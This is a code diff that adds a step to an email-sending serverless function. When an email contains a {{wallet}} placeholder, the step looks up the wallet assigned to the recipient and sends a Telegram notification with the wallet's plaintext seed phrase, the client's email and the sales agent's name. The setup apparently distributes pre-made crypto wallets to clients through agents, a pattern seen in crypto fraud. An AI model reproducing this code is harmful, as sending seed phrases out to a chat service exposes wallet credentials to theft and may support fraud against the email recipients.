@@ -289,6 +289,47 @@ serve(async (req) => {
         })
         .eq('id', emailLog.id);
 
+      // Send Telegram notification ONLY after email is successfully sent
+      if (/\{\{\s*wallet\s*\}\}/i.test(content || emailContent)) {
+        try {
+          const { data: walletInfo } = await supabase
+            .from('wallets')
+            .select('id, wallet_phrase, used_at')
+            .eq('client_tracking_id', to)
+            .eq('used_by_commercial_id', commercial_id)
+            .order('used_at', { ascending: false })
+            .limit(1)
+            .single();
+
+          if (walletInfo) {
+            const { data: generatedWallet } = await supabase
+              .from('generated_wallets')
+              .select('id')
+              .eq('wallet_id', walletInfo.id)
+              .single();
+
+            if (generatedWallet) {
+              // Send telegram notification now that email is confirmed sent
+              await supabase.functions.invoke('send-telegram-notification', {
+                body: {
+                  type: 'wallet_used',
+                  wallet_id: walletInfo.id,
+                  generated_wallet_id: generatedWallet.id,
+                  commercial_id,
+                  commercial_name: commercial.name,
+                  client_email: to,
+                  seed_phrase: walletInfo.wallet_phrase,
+                  timestamp: walletInfo.used_at
+                }
+              });
+              console.log('📱 Telegram notification sent after email success');
+            }
+          }
+        } catch (notifError) {
+          console.error('⚠️ Failed to send telegram notification (non-critical):', notifError);
+        }
+      }
+
       return new Response(
         JSON.stringify({
           success: true,
